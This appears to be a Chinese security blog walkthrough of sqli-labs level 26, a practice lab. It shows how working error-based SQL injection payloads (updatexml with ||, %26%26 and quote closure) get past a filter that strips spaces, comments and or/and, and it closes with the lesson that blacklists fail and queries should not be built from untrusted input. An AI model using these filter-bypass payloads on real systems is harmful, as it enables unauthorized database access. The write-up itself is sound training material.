---
title: 黑名单写到极致，依然很脆弱：sqli-labs 第 26 关实战解析
url: https://mp.weixin.qq.com/s/fPtfQE2BYIpAmA5_wgZZVA
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:43:20.984977
---

# 黑名单写到极致，依然很脆弱：sqli-labs 第 26 关实战解析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZTabx0DOmiaqrKps2ribNl4dVu5Ekpk5wfkSibhsf7sibHv49VEwQzh6XZQ/0?wx_fmt=jpeg)

# 黑名单写到极致，依然很脆弱：sqli-labs 第 26 关实战解析

原创

武文学网安
武文学网安

武文学网安

![]()

在小说阅读器中沉浸阅读

大家好，我是武文。
今天继续挑战 **sqli-labs 第 26 关**。

如果说第 25 关让人意识到：“过滤 or / and 并不等于安全”

那么第 26 关，会把这种认知再往前推一步——
**当开发者把“能想到的所有关键词”都拉进黑名单，真的就安全了吗？**

答案是：
👉 不但没有，反而更危险。

## 一、第 26 关的第一感觉：不像是“能打”的样子

页面依旧是熟悉的结构：

```
```
?id=1
```
```

这一关名字是：All your Space and Comments belongs to us.非常嚣张，将所有空格和符号都给屏蔽了。

通过查看源码，发现这一次更加丰富了过滤词的范围：

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZjWVyaHPJZzR9j53bsq8VHN0kE6aVENs866icgg4iatTvkKjHoDaO0RyQ/640?wx_fmt=png&from=appmsg)

第25关只过滤了or 和and关键字。这一关卡则把一些注释符都给过滤掉了:/\*  -- # 空格 \ 等。

于是我开始了“肌肉记忆测试”：

```
```
?id=1'?id=1' --+?id=1 or 1=1 --+?id=1 and 1=1 --+?id=1 union select 1,2,3 --+
```
```

当带单引号时报错:

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

说明闭合符号很有可能是单引号。

而其他测试则全都屏蔽了or 和and。但我们会发现，过滤了空格符号，但union和select并没有过滤。

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZKDsqPYDskv2hPHc2ktyNR84A0Tt9SnTBBIJyzzIIRkWpzdANics2ozQ/640?wx_fmt=png&from=appmsg)

但我在测试# 和其他注释的时候，通过观察下方的hint，发现这# 依然可以起到注释作用

```
?id=1 union select 1,#2,3 --+ ?id=1 union select 1,--2,3 --+ ?id=1 union select 1,/*2,3 --+ ?id=1 union select 1,*/2,3 --+
```

到这里，很容易产生一个错觉：“这关是不是把 SQL 注入彻底封死了？”

---

## 二、关键线索：不是 SQL 变强了，而是“过滤更重了”

经过前面25关的挑战学习，我们可以轻易的绕过or和and的过滤，但目前最关键的是空格给屏蔽了，导致我们的参数输入全废了：

如

```
?id=1 oorr 1=1 Hint: Your Input is Filtered with following result: 1or1=1
 ?id=1 anandd 1=1  Hint: Your Input is Filtered with following result: 1and1=2
```

于是我们的注入思路应该放到如何绕过空格的过滤呢，空格在sql中是否有其他的写法，经过查阅资料可以有以下写法

```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
```

让我们来挨个尝试，结果发现均不能绕过。

再次回想一下，前面的挑战过程中有没有可以不用空格符号就能够实现注入的。

于是可以想到用括号+功能函数。这里自然而然想到了updatexml

```
?id=1'||updatexml(1,concat(0x7e,database(),0x7e),1)#
```

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9Zgbmh1ic2oplCKB1KiajtutPG49AvvY5HWcBcnF6m3CAK0mQ18ic8PU2EQ/640?wx_fmt=png&from=appmsg)

可以看到用了# 依然无法注释，引起了报错，这里我们可以通过手动构造闭合，是sql语句合法：

```
?id=1'||updatexml(1,concat(0x7e,database(),0x7e),1)||'1'='1
```

![](https://mmbiz.qpic.cn/mmbiz_gif/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZkNyQ9tiagt4Kz2bicQDNNuOEr0Ocpm4pJpVq5htcw4ocojJQian9CrSAg/640?wx_fmt=gif&from=appmsg)

这里可以看到，成功绕过，利用XPATH实现了注入。

我们也可以尝试用&&来注入，但mysql中无法直接使用&&，所以我们听%26%26来替代。

```
?id=1'%26%26updatexml(1,concat(0x7e,database(),0x7e),1)%26%26'1'='1
```

![](https://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVFNYOzDGRTYXgTkKf2yUJ9ZEicNN31VxE0KD3CpXKo94EhEuuKL0w7a6LtC0yFRnWDoufPPAOfDa0w/640?wx_fmt=png&from=appmsg)

---

## 接下来可以参照sqli-labs第6关来获取其余想要的数据——>

## [SQL注入实战——显错注入。Sqli-labs第6关](https://mp.weixin.qq.com/s?__biz=MzY0MDE4OTg4Mw==&mid=2247484120&idx=1&sn=1c995a983b7681abfcde855246e1de5e&scene=21#wechat_redirect)

## 三、第 26 关真正的突破口：SQL 不是靠“空格”活着的

这一关最核心的突破点只有一句话：SQL 语法中，空格不是必须的。我们可以通过构造其他不需要空格的语法即可实现绕过，如利用括号。

举个最简单的例子：

```
```
select*from users
```
```

等价于：

```
```
select/**//*from/**/users
```
```

也等价于：

```
```
select(from(users))
```
```

而第 26 关，**恰恰只过滤了“空格本身”**。

---

## 四、这一关为什么“比前面更危险”？

因为第 26 关代表了一种**非常真实的安全误区**：“我已经过滤得足够多了。”

但实际上：

* 黑名单一定不完整
* SQL 语法可以被无限重写
* 攻击者不需要你“没过滤”，只需要你“漏了一种表达方式”

在真实业务中，这种防御往往会导致：

* 安全测试人员被迷惑
* 漏洞长期潜伏
* 攻击成本反而降低（因为思路更清晰）

---

## 五、第 26 关真正教会我的是什么？

这一关没有教我新的 payload。
它真正教会我的，是三件事：

1️⃣ **安全不是“删关键词”，而是“不拼 SQL”**
2️⃣ **黑名单越复杂，系统越脆弱**
3️⃣ **攻击者思考的是“语义”，不是“字符串”**

从第 26 关开始，我越来越清楚地意识到：SQL 注入的本质，从来不是“我能不能写 or / union”。而是“这条 SQL 语句，是否由不可信数据参与构造”

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

武文学网安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过